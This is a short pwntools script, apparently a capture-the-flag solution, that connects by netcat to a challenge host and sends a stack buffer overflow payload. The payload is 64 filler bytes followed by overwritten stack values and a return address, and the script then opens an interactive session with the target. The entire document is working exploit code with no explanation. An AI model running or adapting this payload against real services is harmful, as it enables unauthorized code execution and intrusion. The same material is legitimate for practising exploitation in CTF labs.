import pwn 


p= pwn.process("nc 7a7e583e9d.pwnth-vulnerable.numa.host 9992", shell=True)


exploit=b"\x41"*64+ b"\xff\xff\xec\xb0\x00\x00\x7f\xff"[::-1] + b"\x00\x40\x12\x7c"[::-1]

print(p.recvregex(b":")) # read until we get the prompt

print("Sending Exploit")
p.sendline(exploit)
print("Send"+ str(exploit))

p.interactive()
